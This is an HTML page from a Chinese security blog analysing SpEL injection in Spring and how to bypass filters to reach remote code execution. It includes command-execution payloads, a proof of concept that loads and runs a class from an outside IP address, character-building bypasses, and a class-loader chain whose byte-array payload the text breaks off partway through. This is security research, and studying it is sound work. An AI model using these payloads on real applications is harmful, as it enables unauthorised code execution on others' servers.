@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>SpEL注入RCE分析与绕过以及java单向执行链的思考 | s1mple</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="s1mple">
+    <meta name="author" content="s1mple">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">s1mple</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2022-03-20T12:38:27.000Z" itemprop="datePublished">
+          2022-03-20
+      </time>
+    
+</span>
+                <h1>SpEL注入RCE分析与绕过以及java单向执行链的思考</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<h2 id="spel简介："><a href="#spel简介：" class="headerlink" title="spel简介："></a>spel简介：</h2><p>一篇老文章了，放在电脑里许久了，今天发出来；</p>
+<p>Spring表达式语言（简称 <strong>SpEL</strong>，全称<strong>Spring Expression Language</strong>）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。</p>
+<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法:"></a>基本用法:</h3><p>SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p>
+<p>下面来记述几种用法：</p>
+<p>示例1:不注册新变量的用法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();<span class="comment">//创建解析器</span></span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;new java.lang.ProcessBuilder(new String[]&#123;&quot;</span>open<span class="string">&quot;,&quot;</span>/System/Applications/Calculator.app<span class="string">&quot;&#125;).start()&quot;</span>);<span class="comment">//解析表达式</span></span><br><span class="line">System.out.println( exp.getValue() );<span class="comment">//弹出计算器；</span></span><br></pre></td></tr></table></figure>
+
+<p>一个基本的例子；</p>
+<p>示例2:自定义注册加载变量的用法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">s1mple</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;play_is_nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s1mple s1mple = <span class="keyword">new</span> s1mple();</span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context=<span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setVariable(<span class="string">&quot;s1mple&quot;</span>,s1mple);</span><br><span class="line">Expression test_expressions = parser.parseExpression(<span class="string">&quot;#s1mple.play()&quot;</span>);</span><br><span class="line">System.out.println(test_expressions.getValue(context));<span class="comment">//输出play_is_nice</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到也可利用上下文环境，向上下文环境中set一些映射，然后利用<code>#</code>拿到相关的映射；</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE:"></a>RCE:</h2><p>之前已经给过一些例子了，就在上面，一些基本的点可以直接rce；比如常规的调用processbuilder和runtime这些；那么下面就给出几个不算是很常规的rce点；</p>
+<p>相信研究过jndi在高版本jdk下的一些敏感利用方式，其中有一个是利用jsEngine进行攻击，调用其下的eval方法执行；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LC8B9g"><img src="https://s1.ax1x.com/2022/04/08/LC8B9g.png" alt="LC8B9g.png"></a></p>
+<p>可以很清晰的看到已经执行了命令，那么这个逻辑其实也是很常见，在高版本的jndi注入下很常用，结合BeanFactory经常用来绕过JEP290的一些点；非常的常见；但是对于没有研究过高版本jdk下的一些利用的话就可能不是很常见了；</p>
+<p>Poc如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span></span><br><span class="line"><span class="string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;new java.lang.ProcessBuilder(s).start();&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里获取js引擎的方法有很多种；[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]，所以在getEngineByName的时候写法也会有很多，相关性可以看下面这个链接的简单描述；</p>
+<p><code>https://www.jianshu.com/p/030421180283</code></p>
+<h2 id="一些骚姿势RCE："><a href="#一些骚姿势RCE：" class="headerlink" title="一些骚姿势RCE："></a>一些骚姿势RCE：</h2><p>利用反射进行rce的操作；对于反射，相信不用再多提。是一种动态获取信息以及动态调用对象方法的功能；</p>
+<h3 id="方法一：-URLClassLoader加载class导致rce"><a href="#方法一：-URLClassLoader加载class导致rce" class="headerlink" title="方法一： URLClassLoader加载class导致rce"></a>方法一： URLClassLoader加载class导致rce</h3><p>这里需要对classloader有一些清晰的认知，classloader可以从两个角度来看待其之间的关联；</p>
+<p>一：静态代码角度；</p>
+<p>这个角度来看待，appClassLoader和ExtClassLoader都继承于URLClassLoader这个classloader；可以看作是其拓展，urlCLassLoader又是继承与SecureClassLoader，SecureClassLoader又继承于ClassLoader这个class；它是一个基类，也是抽象类；</p>
+<p>二：树的角度来看待；</p>
+<p>从这个角度来看待就可以理解双亲委派的一些机制，这个角度来看待AppClassLoader的parent是ExtClassLoader；ExtClassLoader的parent为null；因为BootStrapClassLoader是用C++实现的，在初始化初期，BootStrapClassLoader直接初始化ExtClassLoader和AppClassLoader两个ClassLoader；</p>
+<p>回到主题，远程加载CLass进行rce：给出Poc：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;<span class="keyword">new</span> java.net.URL(\<span class="string">&quot;http://120.53.29.60:9900/\&quot;)&#125;).loadClass(\&quot;Exp\&quot;).getConstructor().newInstance()</span></span><br></pre></td></tr></table></figure>
+
+<p>远程server为如下图：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LCoNqJ"><img src="https://s1.ax1x.com/2022/04/09/LCoNqJ.png" alt="LCoNqJ.png"></a></p>
+<p>原理也不是很难理解；也算是比较常规的操作之一；</p>
+<h3 id="方法二：AppClassLoader加载CLass；"><a href="#方法二：AppClassLoader加载CLass；" class="headerlink" title="方法二：AppClassLoader加载CLass；"></a>方法二：AppClassLoader加载CLass；</h3><p>之前分析过，静态结构来看，AppClassLoader继承于URLClassLoader；其可以加载本地classpath中的一些class；获取相关的ClassLoader也很简单，直接</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader.getSystemClassLoader();</span><br></pre></td></tr></table></figure>
+
+<p>拿到即可，然后就是一些常规操作，loadClass相关的恶意class之类的，比如runtime或者ProcessBuilder；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(ClassLoader).getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>常规操作，没什么好讲的；积累经验；</p>
+<p>同理：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(ClassLoader).getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructors()[<span class="number">1</span>].newInstance(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;open&quot;</span>,<span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()</span><br></pre></td></tr></table></figure>
+
+<p>loadClass之后返回的是一个Class对象，所以后续就可进行相关的操作；也不难理解；</p>
+<h3 id="方法三：采用字符bypass；"><a href="#方法三：采用字符bypass；" class="headerlink" title="方法三：采用字符bypass；"></a>方法三：采用字符bypass；</h3><p>直接拿例子说话，先来看个Poc：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T(String).getName()[<span class="number">0</span>].replace(<span class="number">106</span>,<span class="number">104</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个结果返回的是<code>h</code>；至于原因其实很好理解，前面返回java.xxxxx，然后拿到第一个字符，然后替换一下；就可以改变成我们需要的字符，其实不是很难理解；</p>
+<h3 id="方法四：通过内置的对象获取Classloader；"><a href="#方法四：通过内置的对象获取Classloader；" class="headerlink" title="方法四：通过内置的对象获取Classloader；"></a>方法四：通过内置的对象获取Classloader；</h3><p>​    其实这个点已经很常见了。还记得在tomcat的内存马那个分析的时候是如何获取StandardContext的嘛。最开始的入口点是在request里，通过request拿到相关的Context属性，然后进一步向前推，拿到StandardContext；所以这里可以类比一下，同理；一般一些web服务在最开始的时候就会将request和response进行注册，所以通过这内置的属性，就可直接进行相关classLoader的获取；</p>
+<p>这种方法之前也有很多师傅们研究过，我这边就借用了；</p>
+<p><code>https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&amp;idx=1&amp;mid=2650174018&amp;sn=94cd324370afc2024346f7c508ff77dd</code></p>
+<p>可以采用Character构建字符串等等；我这里就不多提了；</p>
+<h3 id="方法五：外部可控字符进行绕过"><a href="#方法五：外部可控字符进行绕过" class="headerlink" title="方法五：外部可控字符进行绕过"></a>方法五：外部可控字符进行绕过</h3><p>结合相关的请求；采用request来进行获取GET或者POST字符，然后进行replace。也是老套路了；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#request.getMethod().substring(0,1).replace(80,104)%2b#request.getMethod().substring(0,1).replace(80,51)%2b#request.getMethod().substring(0,1).replace(80,122)%2b#request.getMethod().substring(0,1).replace(80,104)%2b#request.getMethod().substring(0,1).replace(80,49)//post</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#request.getMethod().substring(0,1).replace(71,104)%2b#request.getMethod().substring(0,1).replace(71,51)%2b#request.getMethod().substring(0,1).replace(71,122)%2b#request.getMethod().substring(0,1).replace(71,104)%2b#request.getMethod().substring(0,1).replace(71,49)//get</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>或者在header里进行相关的处理获取：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request.getRequestedSessionId();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>cookie中的jsessionid读取数据，然后用其来替代一些spel表达式中的str；可以实现饶过；</p>
+<h2 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h2><p>​    其实我们不妨换个角度来考虑一下这个问题，整体的流程来看。spel只是属于单向代码执行链；它并不像java的一般gadget反射那么的灵活，可以通过setAccessible来取消默认Java语言访问控制检查的能力；所以基于此，我们并不能很活泛的去执行一些命令或者说调用一些方法；</p>
+<p>​    举个具体的例子；假如对应类Runtime里面的getRuntime方法的描述符规定的访问权限不为public，此时我们的单向代码执行链就无法执行下去，然而对于java的反射gadgets，可以通过setAccessible进行取消java的检查能力，单向代码执行链之所以不能利用，是因为单向代码执行是需要建立在前一个执行有返回结果的基础之上的，无论是返回对象或者是Class对象，需要以此来作为执行的基础，然而setAccessible是没有返回值的；所以基于这个角度来说，单向执行链条还是有一定的局限的，这也就为spel深入的探索埋下了伏笔；所以我们为了执行一些命令并尽可能的拿到回显，就不光是需要一个可以执行代码的上下文，更需要一个当前执行环境中的上下文；实现这两点的关键问题所在就是转化成了我们需要当前环境下的classloader进行加载我们需要运行的代码或者通过其他的脚本引擎加载代码；</p>
+<p>相关的classloader的一点利用在上面已经有过一些补充，下面具体的看看：Classloader在加载class的时候也是符合着双亲委派的模式的，是需要定义好parentClassLoader的；除非是启动类加载器或者专门去打破双亲委派的情况。所以在loadClass之前需要定义好当前的classLoader的实例才可以运行（即设定好parentClassLoader）；大部分第三方实现的ClassLoader都需要用户自行获取并传入自定义或上下文的classLoader对象，比如：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/Lib8Yj"><img src="https://s1.ax1x.com/2022/04/09/Lib8Yj.png" alt="Lib8Yj.png"></a></p>
+<p>​    同时ClassLoader类也不支持序列化因此也无法传入，所以我们要找到直接可以调用的就需要满足它运行时自己获取了上下文的classLoader而不用我们传入。其实根本上是因为无论是loadClass还是defineClass，在进行加载class的时候都会对class进行检查的操作，检查其是否继承一些class；由于我们需要去define的类是继承于Object的；所以就会采用我们使用的类加载器调用loadClass来加载java.lang.Object。也就是说肯定会出现父类（这里是java.lang.Object）进入到loadClass方法；如果自定义的第三方classloader没有设置父classloader，那么就会报错，爆出空指针或者NoClassDefFoundError；具体的还要根据实际情况来看；</p>
+<p>找一下就可以找到一些：</p>
+<p>如果目标有rhino依赖，那么就有一个可以利用的链；在jdk版本比较低的时候会存在这个class；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.mozilla.javascript.DefiningClassLoader</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LFSgc4"><img src="https://s1.ax1x.com/2022/04/09/LFSgc4.png" alt="LFSgc4.png"></a></p>
+<p>可以看到，在这个class下的构造方法，其中直接赋值了parentLoader；其下还有个defineClass可以利用；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LFNFbQ"><img src="https://s1.ax1x.com/2022/04/09/LFNFbQ.png" alt="LFNFbQ.png"></a></p>
+<p>可以很清晰的看到效果；直接弹；</p>
+<p>放出我server的逻辑；我的server是springboot；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LFNm80"><img src="https://s1.ax1x.com/2022/04/09/LFNm80.png" alt="LFNm80.png"></a></p>
+<p>攻击载荷如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exp</span><br><span class="line">-<span class="number">54</span>,-<span class="number">2</span>,-<span class="number">70</span>,-<span class="number">66</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">40</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">24</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">27</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">28</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">29</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">31</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">60</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">62</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">86</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">76</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">78</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">84</span>,<span class="number">97</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">18</span>,<span class="number">76</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">86</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">97</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">84</span>,<span class="number">97</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">76</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">112</span>,<span class="number">59</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">60</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">62</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">76</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">47</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">69</span>,<span class="number">120</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">59</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">77</span>,<span class="number">97</span>,<span class="number">112</span>,<span class="number">84</span>,<span class="number">97</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">29</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">83</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">70</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">112</span>,<span class="number">46</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">34</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">35</span>,<span class="number">0</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">47</span>,<span class="number">65</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">47</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">46</span>,<span class="number">97</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">47</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">115</span>,<span class="number">47</span>,<span class="number">77</span>,<span class="number">97</span>,<span class="number">99</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">47</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">37</span>,<span class="number">0</span>,<span class="number">38</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">19</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">47</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">69</span>,<span class="number">120</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">39</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">112</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">79</span>,<span class="number">98</span>,<span class="number">106</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">20</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">122</span>,<span class="number">97</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">17</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">82</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">82</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">76</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">103</span>,<span 